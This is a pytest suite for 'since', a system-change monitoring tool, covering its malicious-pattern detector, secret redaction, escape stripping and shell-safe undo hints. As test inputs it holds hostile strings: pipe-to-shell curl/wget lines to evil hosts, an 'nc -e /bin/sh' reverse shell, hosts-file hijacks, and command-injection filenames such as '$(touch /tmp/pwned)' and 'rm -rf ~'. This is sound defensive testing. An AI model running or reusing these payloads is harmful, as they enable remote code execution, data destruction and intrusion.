"""Unit tests for since. Pure-function + synthetic-snapshot coverage — no reliance
on the host's real system state, so they run anywhere. Focus is the logic that the
code review found bugs in (severity routing, port surfacing, injection-safety,
privilege guard, corruption tolerance) plus the core diff/time primitives.

Run:  python3 -m pytest   (or just: pytest)
"""
import json
import shlex
import time

import pytest

import since


# --------------------------------------------------------------------------- helpers
def snap(collectors=None, blobs=None, root=False, epoch=None):
    s = {
        "schema": since.SCHEMA_VERSION, "platform": "macos",
        "created": "2026-07-24T09:00:00",
        "epoch": epoch if epoch is not None else int(time.time()),
        "root": root, "euid": 0 if root else 501, "errors": {},
        "collectors": {k: {} for k in since.CAT}, "blobs": blobs or {},
    }
    for k, v in (collectors or {}).items():
        s["collectors"][k] = v
    return s


@pytest.fixture(autouse=True)
def _no_history(monkeypatch):
    # deterministic: no attribution from the test runner's shell history
    monkeypatch.setattr(since, "_HISTORY", [])


# --------------------------------------------------------------------------- time
def test_parse_when_forms():
    now = time.time()
    assert abs(now - since.parse_when("1d") - 86400) < 5
    assert abs(now - since.parse_when("12h") - 43200) < 5
    assert abs(now - since.parse_when("yesterday") - 86400) < 5
    assert since.parse_when("3 hours ago") < now
    assert since.parse_when("an hour ago") < now
    # weekday resolves to a past midnight
    assert since.parse_when("monday") < now


def test_parse_when_rejects_garbage():
    with pytest.raises(ValueError):
        since.parse_when("next thursday-ish")


# --------------------------------------------------------------------------- diff
def test_diff_dicts():
    a, r, c = since.diff_dicts({"x": 1, "y": 2}, {"y": 9, "z": 3})
    assert a == ["z"] and r == ["x"] and c == ["y"]


def test_base_level():
    assert since.base_level("persistence", "added") == since.ORANGE
    assert since.base_level("software", "added") == since.YELLOW
    assert since.base_level("network", "removed") == since.GREEN


# --------------------------------------------------------------------------- injection safety (C3/M6/M4)
def test_undo_launch_item_is_shell_safe(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    mal = "~/Library/LaunchAgents/x'$(touch /tmp/pwned)'.plist"
    real = mal.replace("~", str(since.HOME), 1)
    hint = since.undo_hint("launch_items", mal, None)
    assert shlex.quote(real) in hint          # the payload is fully quoted
    assert "$(touch /tmp/pwned) 2>" not in hint  # never sits outside quoting


def test_undo_login_item_uses_argv(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    hint = since.undo_hint("login_items", 'Evil" name', None)
    assert "item 1 of argv" in hint
    assert shlex.quote('Evil" name') in hint


def test_undo_daemon_uses_system_domain(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    hint = since.undo_hint("launch_items", "/Library/LaunchDaemons/evil.plist", None)
    assert "bootout system" in hint and hint.count("sudo") >= 2


def test_undo_pkg_names_quoted():
    assert shlex.quote("x; rm -rf ~") in since.undo_hint("npm_global", "x; rm -rf ~", None)


# --------------------------------------------------------------------------- terminal-escape + secret hygiene (H1/M5)
def test_clean_strips_control_and_escape():
    out = since.clean("Evil\x1b[2Kname\x07\x00")
    assert "\x1b" not in out and "\x07" not in out and "\x00" not in out


def test_redact_masks_secrets():
    assert "SECRET" not in since.redact("//r/:_authToken=SECRETVALUE")
    assert "«redacted»" in since.redact("export API_KEY=abcdef123")
    assert "«redacted»" in since.redact("-----BEGIN OPENSSH PRIVATE KEY-----")
    # a normal line is untouched
    assert since.redact("alias ll='ls -la'") == "alias ll='ls -la'"


# --------------------------------------------------------------------------- malicious patterns (L2)
@pytest.mark.parametrize("line", [
    "curl http://evil.sh | sh",
    "wget -qO- evil | bash",
    "echo x | base64 -d | sh",
    "sh <(curl http://evil)",
    "nc -e /bin/sh 10.0.0.1 4444",
    "0.0.0.0 www.apple.com",
    "127.0.0.1 www.mybank.com",
])
def test_malicious_patterns_match(line):
    assert any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


@pytest.mark.parametrize("line", ["127.0.0.1 localhost", "255.255.255.255 broadcasthost",
                                  "alias g=git", "export EDITOR=vim"])
def test_malicious_patterns_no_false_positive(line):
    assert not any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


# --------------------------------------------------------------------------- C1: escalated inventory item is ranked
def test_unsigned_app_escalates_and_is_loud(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: ("unsigned", True))
    b = snap()
    c = snap(collectors={"applications": {"EvilApp": "/Applications"}})
    findings = since.build_findings(b, c)
    app = next(f for f in findings if f["category"] == "applications")
    assert app["level"] == since.RED
    out = since.render(findings, b, c, [], [])
    assert "Worth a look" in out and "signature: unsigned" in out


# --------------------------------------------------------------------------- C2: new port on known listener
def test_new_port_on_known_listener_surfaces():
    b = snap(collectors={"listening": {"postgres": "5432"}})
    c = snap(collectors={"listening": {"postgres": "4444,5432"}})
    findings = since.build_findings(b, c)
    lf = [f for f in findings if f["category"] == "listening"]
    assert any(f.get("added_ports") == ["4444"] for f in lf)


def test_full_port_turnover_is_suppressed():
    b = snap(collectors={"listening": {"rapportd": "5000,6000"}})
    c = snap(collectors={"listening": {"rapportd": "5001,6002"}})
    findings = since.build_findings(b, c)
    assert not [f for f in findings if f["category"] == "listening"]


# --------------------------------------------------------------------------- H3: privilege-sensitive blobs
def test_priv_blob_skipped_on_mismatch():
    b = snap(blobs={"/etc/sudoers": "root ALL\n", "crontab (current user)": "0 5 * * * x\n"}, root=True)
    c = snap(blobs={})
    kept = since.build_findings(b, c, skip_cats=since.PRIV_SENSITIVE_CATS, skip_priv_blobs=True)
    assert not [f for f in kept if since._is_priv_blob(f["key"])]
    # control: without the skip they DO appear
    naive = since.build_findings(b, c)
    assert [f for f in naive if f["key"] == "/etc/sudoers"]


# --------------------------------------------------------------------------- H4/M5: storage
def test_write_private_is_atomic_and_0600(tmp_path):
    p = tmp_path / "sub" / "snap.json"
    since._write_private(p, '{"ok": 1}')
    assert p.exists() and (p.stat().st_mode & 0o777) == 0o600
    assert json.loads(p.read_text()) == {"ok": 1}


def test_safe_load_tolerates_corruption_and_wrong_shape(tmp_path):
    good = tmp_path / "good.json"
    good.write_text(json.dumps({"created": "2026-07-24T09:00:00", "epoch": 1, "collectors": {}}))
    assert since.safe_load(good)["epoch"] == 1
    for junk in ('{"epoch": 1', "{}", "[]", '{"epoch": 1}', '"a string"'):  # truncated OR valid-but-wrong-shape
        p = tmp_path / "x.json"; p.write_text(junk)
        assert since.safe_load(p) is None, junk


# --------------------------------------------------------------------------- render never emits raw escapes (H1)
def test_render_emits_no_raw_escape():
    b = snap()
    c = snap(collectors={"login_items": {"Evil\x1b[2Kname\x07": "x"}})
    out = since.render(since.build_findings(b, c), b, c, [], [])
    assert "\x1b" not in out and "\x07" not in out


# --------------------------------------------------------------------------- severity ordering
def test_clean_strips_newline_and_bidi():
    # a newline in a name would inject a forged extra output line (H1 reopened)
    assert "\n" not in since.clean("legit\n  signature: Apple-signed")
    assert "\r" not in since.clean("a\rb")
    assert "\x1b" not in since.clean("a\x1b[31mb")   # ESC still stripped
    # TAB is deliberately KEPT (v2 audit #11): it cannot forge a line, and stripping it
    # mangled tab-indented config diffs. Newline/CR/ESC (which CAN forge) stay stripped.
    assert since.clean("a\tb") == "a\tb"
    assert since.clean("x‮y") == "x�y"   # bidi override
    assert since.clean("x​y") == "x�y"   # zero-width space
    assert since.clean("a" + chr(0x2028) + "b") == "a�b"   # U+2028 line separator (finding 6)
    assert since.clean("a" + chr(0x2029) + "b") == "a�b"   # U+2029 paragraph separator
    # lone UTF-16 surrogate (non-UTF-8 Linux filename via surrogateescape) — must be
    # neutralized, not raise UnicodeEncodeError when the report is printed (v2 audit #7)
    assert since.clean("a\udc80b") == "a�b"
    assert since.clean("normal name") == "normal name"


def test_render_cannot_be_line_injected():
    # login item whose NAME contains newlines trying to forge a standalone
    # "signature: Apple-signed" / "undo: rm -rf ~" line
    b = snap()
    c = snap(collectors={"login_items": {"evil\n  signature: Apple-signed\n  undo: rm -rf ~": "x"}})
    out = since.render(since.build_findings(b, c), b, c, [], [])
    stripped = [l.strip() for l in out.splitlines()]
    # the forged text must NOT appear as its own line (newline injection defeated)
    assert "signature: Apple-signed" not in stripped
    assert "undo: rm -rf ~" not in stripped
    # it survives only harmlessly inline within one mangled name line
    assert any("signature: Apple-signed" in l and l.startswith("🟠") for l in stripped)


@pytest.mark.parametrize("line,secret", [
    ("Authorization: Bearer eyJ0.SECRETBODY.sig", "SECRETBODY"),
    ("GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ghp_ABCDEF"),
    ("aws_access_key_id = AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"),
    ("clone https://user:hunter2@host/x", "hunter2"),
    ("//r/:_authToken=SEKRIT", "SEKRIT"),
])
def test_redact_no_leak(line, secret):
    assert secret not in since.redact(line)


def test_redact_no_false_positive_on_nopasswd():
    line = "deploy ALL=(ALL) NOPASSWD: ALL"
    assert since.redact(line) == line   # the security-critical token must stay visible


def test_removed_port_on_kept_listener_surfaces():
    b = snap(collectors={"listening": {"node": "3000,3001"}})
    c = snap(collectors={"listening": {"node": "3001"}})   # dropped 3000, kept 3001
    lf = [f for f in since.build_findings(b, c) if f["category"] == "listening"]
    assert lf and lf[0].get("removed_ports") == ["3000"]


def test_priv_blob_covers_all_cron():
    for k in ("/etc/sudoers", "crontab (current user)", "/etc/crontab", "/etc/cron.d/x"):
        assert since._is_priv_blob(k), k
    assert not since._is_priv_blob("~/.zshrc")


def test_linux_undo_hints(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "linux")
    assert since.undo_hint("launch_items", "nginx.service", None) == "sudo systemctl disable --now nginx.service"
    assert since.undo_hint("launch_items", "user:foo.service", None) == "systemctl --user disable --now foo.service"
    assert since.undo_hint("kernel_extensions", "evil_rk", None).startswith("sudo modprobe -r evil_rk")
    assert since.undo_hint("brew", "nginx", None).startswith("sudo apt remove nginx")
    assert since.undo_hint("brew", "code (snap)", None) == "sudo snap remove code"
    assert since.undo_hint("login_items", "x.desktop", None).startswith("rm ")
    # attacker-chosen names are still shlex-quoted on Linux
    assert shlex.quote("a; rm -rf ~") in since.undo_hint("brew", "a; rm -rf ~", None)


def test_linux_labels(monkeypatch):
    # the label override map is applied only when PLATFORM=='linux'
    assert since.CAT["brew"]["label"] in ("Homebrew packages", "System packages (apt/dnf/…)")


def test_platform_note(monkeypatch):
    for supported in ("macos", "linux"):
        monkeypatch.setattr(since, "PLATFORM", supported)
        assert since.platform_note() is None
    monkeypatch.setattr(since, "PLATFORM", "sunos")   # genuinely unsupported
    note = since.platform_note()
    assert note and "UNSUPPORTED" in note and "sunos" in note


def test_findings_sorted_most_severe_first(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap()
    c = snap(collectors={"login_items": {"a": "a"}},
             blobs={"~/.zshrc": None, "/etc/hosts": "0.0.0.0 www.bank.com\n"})
    # /etc/hosts redirect is RED, login item is ORANGE
    findings = since.build_findings(b, c)
    levels = [f["level"] for f in findings]
    assert levels == sorted(levels, reverse=True)


# =========================================================================== #
# Second independent (Kimi) audit — regression tests for each fixed finding.   #
# =========================================================================== #

# #2 — over-redaction must NOT conceal the sshd/sudoers attacks the tool exists to
# surface. Keyword-in-KEY is not enough; the VALUE (a path, a keyword, a short flag)
# must still be shown so a malicious change is visible.
@pytest.mark.parametrize("line", [
    "AuthorizedKeysFile /tmp/evil/keys",   # attacker redirects trusted keys — must SHOW the path
    "PasswordAuthentication no",
    "PermitRootLogin yes",
    "    NOPASSWD: /bin/bash",
    "%admin ALL=(ALL) NOPASSWD: ALL",
    "# basic networking setup",            # #6 benign prose under _SCHEME_RE
    "# no secret here",                    # sensitive word in KEY, short prose value
    "AuthorizedKeysCommandUser nobody",    # directive-name substring + plain-word value
    "AuthorizedKeysCommandUser root",
    "password required pam_unix.so",       # pam directive: credential word + keyword value
    # 3rd-pass independent audit (finding 2): the DEFAULT sshd form uses a RELATIVE path —
    # an absolute-only directive test let this stay hidden.
    "AuthorizedKeysFile .ssh/authorized_keys",
    "AuthorizedKeysFile %h/.ssh/authorized_keys",
    "AuthorizedKeysCommandUser sshd-keygen",
])
def test_redact_does_not_hide_directives(line):
    assert since.redact(line) == line, "value redacted away — this is exactly what #2 warned about"


# A malicious edit to an AuthorizedKeys* directive must produce a VISIBLE diff, incl. the
# relative-path default form (finding 2: both old and new were redacting to the same string).
def test_redact_authorizedkeys_change_is_visible():
    assert (since.redact("AuthorizedKeysFile .ssh/authorized_keys")
            != since.redact("AuthorizedKeysFile .ssh/evilkeys"))


# #2/#10 — real credentials are masked: single-class tokens, SSHPASS, short values, AND
# (3rd-pass finding 1) values that begin with '/', '~', or '$' — base64 tokens contain '/',
# crypt/shadow hashes begin with '$', so a "looks like a path" bypass would leak them.
@pytest.mark.parametrize("line,secret", [
    ("password=hunter2longtoken", "hunter2longtoken"),
    ("SSHPASS=Sup3rSecret1", "Sup3rSecret1"),
    ("//r/:_authToken=SECRETVALUE", "SECRETVALUE"),      # single-class (all upper) — entropy test would leak this
    ("client_secret: aGVsbG8gd29ybGQxMg==", "aGVsbG8gd29ybGQxMg=="),
    ("passcode=1234", "1234"),                           # short secret via assignment — must NOT leak
    ("password=abc", "abc"),
    ("SSHPASS=$ecretPassw0rd", "ecretPassw0rd"),         # value begins with '$'
    ("//registry.npmjs.org/:_authToken=/AbCdEf123456xyz", "AbCdEf123456xyz"),  # begins with '/'
    ("client_secret=/wJalrXUtnFEMIK7MDENGbPxRfiCY", "wJalrXUtnFEMIK7MDENGbPxRfiCY"),
    ("password=$6$rounds=5000$abcdefLONGhash", "abcdefLONGhash"),   # /etc/shadow crypt hash
    ("_auth=dXNlcjpwYXNz", "dXNlcjpwYXNz"),              # npm base64 basic-auth field
])
def test_redact_still_masks_real_secrets(line, secret):
    assert secret not in since.redact(line)


# =========================================================================== #
# Third full-tool independent audit — regression tests for each fixed finding. #
# =========================================================================== #

# Finding 1 — curl/netrc `user:pass` credentials (`~/.curlrc` is a TRACKED file) must be
# masked; _URLAUTH_RE misses them because they aren't a `://…@` URL.
@pytest.mark.parametrize("line,secret", [
    ('user = "alice:S3cr3tCurlPass"', "S3cr3tCurlPass"),
    ("-u bob:hunter2", "hunter2"),
    ("--proxy-user pu:ppw", "ppw"),
    ("curl -u carol:pw123 https://api.example.com", "pw123"),
    # diff lines carry a +/- marker in the real pipeline — the anchor must survive it
    # (an integration run caught this leaking where the bare-line unit test did not).
    ('+user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
    ('-user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
])
def test_redact_masks_curl_userpass(line, secret):
    assert secret not in since.redact(line)


# End-to-end: one realistic compromised diff through the REAL build_findings+render
# pipeline must (a) escalate malware persistence, (b) keep an sshd redirect VISIBLE,
# (c) REDACT a planted secret in rendered output, (d) neutralize a line-forging name.
# This integration test caught a curlrc leak the isolated redact() unit tests missed.
def test_end_to_end_adversarial_diff(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap(blobs={"~/.bashrc": "export PATH=$HOME/bin\n",
                    "/etc/ssh/sshd_config": "AuthorizedKeysFile .ssh/authorized_keys\n",
                    "~/.curlrc": "silent\n"})
    c = snap(collectors={"login_items": {"Evil\n  signature: Apple-signed\n  undo: rm -rf ~": "x"}},
             blobs={"~/.bashrc": "export PATH=$HOME/bin\ncurl http://evil.sh | sh\n",
                    "/etc/ssh/sshd_config": "AuthorizedKeysFile /tmp/attacker/keys\n",
                    "~/.curlrc": 'silent\nuser = "victim:SuperSecretCurlPw123"\n'})
    findings = since.build_findings(b, c)
    out = since.render(findings, b, c, [], [])
    lines = out.splitlines()
    assert any(f["level"] == since.RED and "bashrc" in f["key"] for f in findings)  # malware -> RED
    assert "/tmp/attacker/keys" in out                                             # sshd redirect visible
    assert "SuperSecretCurlPw123" not in out                                       # secret redacted
    assert not any(l.strip() == "signature: Apple-signed" for l in lines)          # no forged line
    assert not any(l.strip() == "undo: rm -rf ~" for l in lines)


def test_redact_curl_userpass_no_false_positive():
    # no colon → no password embedded → leave it alone
    assert since.redact("user = alice") == "user = alice"
    assert since.redact("# the user configuration: enabled") == "# the user configuration: enabled"


# Finding 2 — a systemd ExecStart swap on an already-enabled unit must change the
# fingerprint (parity with the macOS plist content hash). Proven with a mocked
# `systemctl show` (no real systemd needed).
def test_linux_service_execstart_swap_detected(monkeypatch):
    def fake_run(cmd, **kw):
        if "list-unit-files" in cmd:
            return "evil.service enabled\n"
        if "show" in cmd:
            return f"Id=evil.service\nExecStart={fake_run.exec}\n"
        return ""
    fake_run.exec = "{ path=/usr/bin/true ; argv[]=/usr/bin/true }"
    monkeypatch.setattr(since, "run", fake_run)
    before = since._linux_services()["evil.service"]
    fake_run.exec = "{ path=/tmp/miner ; argv[]=/tmp/miner }"   # same unit, enabled, swapped Exec
    after = since._linux_services()["evil.service"]
    assert before != after, "ExecStart swap invisible — finding 2 not fixed"


# Finding 3 — sudoers.d and the cron.* dirs / spool are privilege-sensitive blobs.
@pytest.mark.parametrize("key", [
    "/etc/sudoers.d/mygrant", "/etc/cron.daily/evil", "/etc/cron.hourly/x",
    "/var/spool/cron/crontabs/root", "/etc/crontab", "/etc/ld.so.preload",
])
def test_priv_blob_covers_sudoers_and_cron_family(key):
    assert since._is_priv_blob(key)


# Finding 4 — an absurd `--since` window must not dump an uncaught OverflowError traceback.
def test_parse_when_absurd_window_no_crash():
    assert since.parse_when("9" * 400 + "d") == 0   # graceful: cut off at epoch (oldest wins)
    assert since.parse_when("1d") > 0                # normal path intact


# #3 — PEM / raw-key body must be masked on the REMOVED (`-`) diff line too, not only `+`.
def test_redact_pem_body_parity_on_minus_line():
    body = "A" * 60
    assert "A" * 60 not in since.redact("-" + body)
    assert "A" * 60 not in since.redact("+" + body)
    assert since.redact("-" + body).startswith("-")   # marker preserved


# #1 — redact() must not go quadratic on an attacker-plantable long rc-file line.
def test_redact_not_quadratic():
    line = "secret=" + "A" * 40000 + "."
    t = time.time()
    since.redact(line)
    assert time.time() - t < 1.0, "redact() is super-linear — a crafted line can stall the daily digest"


# #7 — a lone UTF-16 surrogate (non-UTF-8 Linux filename) must not crash rendering.
def test_clean_surrogate_is_printable():
    out = since.clean("evil\udc80.desktop")
    out.encode("utf-8")   # would raise UnicodeEncodeError before the fix


# #4 — Linux autostart fingerprint folds in a CONTENT hash, so a swapped Exec= (Name=
# unchanged) is detected as a change instead of being invisible.
def test_linux_autostart_detects_exec_swap(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    ad = tmp_path / ".config/autostart"
    ad.mkdir(parents=True)
    entry = ad / "x.desktop"
    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/usr/bin/true\n")
    before = since._linux_autostart()
    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/tmp/miner\n")   # same Name=, evil Exec
    after = since._linux_autostart()
    assert before["x.desktop"] != after["x.desktop"], "Exec swap invisible — #4 not fixed"


# L-f — tilde() collapses only a LEADING $HOME, not every occurrence.
def test_tilde_collapses_only_leading_home(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    h = str(tmp_path)
    assert since.tilde(h + "/data" + h + "/file") == "~/data" + h + "/file"
    assert since.tilde(h) == "~"


# #9 — ld.so.preload (a classic rootkit hook, may be root-only-readable) is treated as a
# privilege-sensitive blob so a root/non-root mismatch can't fabricate an add/remove alarm.
def test_ld_so_preload_is_priv_blob():
    assert since._is_priv_blob("/etc/ld.so.preload")


# L-m — _write_private survives a stale temp left by a crashed run (no O_EXCL crash).
def test_write_private_survives_stale_temp(tmp_path):
    target = tmp_path / "snap.json"
    (tmp_path / f".{target.name}.stale.tmp").write_text("junk")   # pre-existing temp
    since._write_private(target, "hello")
    assert target.read_text() == "hello"
    assert oct(target.stat().st_mode)[-3:] == "600"
